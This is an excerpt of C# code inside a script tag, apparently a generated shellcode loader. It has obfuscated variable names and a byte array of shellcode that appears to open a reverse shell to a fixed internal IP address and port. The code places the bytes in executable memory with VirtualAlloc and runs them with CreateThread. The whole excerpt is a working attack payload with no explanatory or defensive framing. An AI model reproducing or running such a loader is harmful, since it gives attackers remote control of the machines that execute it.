...
0x68,0x0a,0x0a,0x10,0x2c,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr xlny3sA = VirtualAlloc(IntPtr.Zero,(UIntPtr)c3CX.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(c3CX,0,xlny3sA,c3CX.Length);
        IntPtr fbWvIXYG = IntPtr.Zero;
        IntPtr dPMPXb5 = CreateThread(IntPtr.Zero,UIntPtr.Zero,xlny3sA,IntPtr.Zero,0,ref fbWvIXYG);
    }
</script>
